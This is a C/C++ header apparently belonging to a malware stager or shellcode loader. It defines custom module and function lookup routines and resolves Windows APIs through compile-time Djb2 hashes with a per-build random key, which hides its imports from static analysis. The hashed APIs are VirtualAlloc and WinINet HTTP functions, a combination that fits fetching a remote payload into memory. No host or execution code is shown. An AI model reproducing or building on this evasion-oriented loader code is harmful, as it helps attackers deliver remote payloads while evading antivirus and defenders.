#pragma once
#include "Structs.h"


HMODULE myGetModuleHandle(DWORD dwModuleHash);
PVOID myGetProcAddress(HMODULE hModule,DWORD dwApiHash);


typedef HMODULE(WINAPI* myLoadLibraryA)(
	LPCSTR lpLibFileName
);

typedef LPVOID(WINAPI* myVirtualAlloc) (
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect
);
typedef HINTERNET(*myInternetOpenA)(
	LPCSTR lpszAgent,
	DWORD dwAccessType,
	LPCSTR lpszProxy,
	LPCSTR lpszProxyBypass,
	DWORD dwFlags
	);
// InternetConnectA
typedef HINTERNET(WINAPI* myInternetConnectA)(
	HINTERNET hInternet,
	LPCSTR lpszServerName,
	INTERNET_PORT nServerPort,
	LPCSTR lpszUserName,
	LPCSTR lpszPassword,
	DWORD dwService,
	DWORD dwFlags,
	DWORD_PTR dwContext
	);

// HttpOpenRequestA
typedef HINTERNET(WINAPI* myHttpOpenRequestA)(
	HINTERNET hConnect,
	LPCSTR lpszVerb,
	LPCSTR lpszObjectName,
	LPCSTR lpszVersion,
	LPCSTR lpszReferrer,
	LPCSTR* lplpszAcceptTypes,
	DWORD dwFlags,
	DWORD_PTR dwContext
	);

// HttpSendRequestA
typedef BOOL(WINAPI* myHttpSendRequestA)(
	HINTERNET hRequest,
	LPCSTR lpszHeaders,
	DWORD dwHeadersLength,
	LPVOID lpOptional,
	DWORD dwOptionalLength
	);

// InternetReadFile
typedef BOOL(WINAPI* myInternetReadFile)(
	HINTERNET hFile,
	LPVOID lpBuffer,
	DWORD dwNumberOfBytesToRead,
	LPDWORD lpdwNumberOfBytesRead
	);



#define        SEED       5

// generate a random key (used as initial hash)
constexpr int RandomCompileTimeSeed(void)
{
	return '0' * -40271 +
		__TIME__[7] * 1 +
		__TIME__[6] * 10 +
		__TIME__[4] * 60 +
		__TIME__[3] * 600 +
		__TIME__[1] * 3600 +
		__TIME__[0] * 36000;
};

constexpr auto g_KEY = RandomCompileTimeSeed() % 0xFF;


// compile time Djb2 hashing function (WIDE)
constexpr DWORD HashStringDjb2W(const wchar_t* String) {
	ULONG Hash = (ULONG)g_KEY;
	INT c = 0;
	while ((c = *String++)) {
		if (c >= L'a' && c <= L'z')
			c -= 32;
		Hash = ((Hash << SEED) + Hash) + c;
	}

	return Hash;
}

// compile time Djb2 hashing function (ASCII)
constexpr DWORD HashStringDjb2A(const char* String) {
	ULONG Hash = (ULONG)g_KEY;
	INT c = 0;
	while ((c = *String++)) {
		if (c >= 'a' && c <= 'z')
			c -= 32;
		Hash = ((Hash << SEED) + Hash) + c;
	}

	return Hash;
}

namespace Hash {
	constexpr DWORD Kernel32Hash = HashStringDjb2W(L"KERNEL32.DLL");
	constexpr DWORD WininetHash = HashStringDjb2W(L"WININET.DLL");

	constexpr DWORD LoadLibraryAHash = HashStringDjb2A("LoadLibraryA");
	constexpr DWORD VirtualAllocHash = HashStringDjb2A("VirtualAlloc");
	constexpr DWORD InternetOpenAHash = HashStringDjb2A("InternetOpenA");
	constexpr DWORD InternetConnectAHash = HashStringDjb2A("InternetConnectA");
	constexpr DWORD HttpOpenRequestAHash = HashStringDjb2A("HttpOpenRequestA");
	constexpr DWORD HttpSendRequestAHash = HashStringDjb2A("HttpSendRequestA");
	constexpr DWORD InternetReadFileHash = HashStringDjb2A("InternetReadFile");
};

typedef struct _API_TABLE {
	myLoadLibraryA LoadLibrayA;
	myVirtualAlloc VirtualAlloc;
	myInternetOpenA        InternetOpenA;
	myInternetConnectA     InternetConnectA;
	myHttpOpenRequestA     HttpOpenRequestA;
	myHttpSendRequestA     HttpSendRequestA;
	myInternetReadFile     InternetReadFile;
} API_TABLE, * PAPI_TABLE;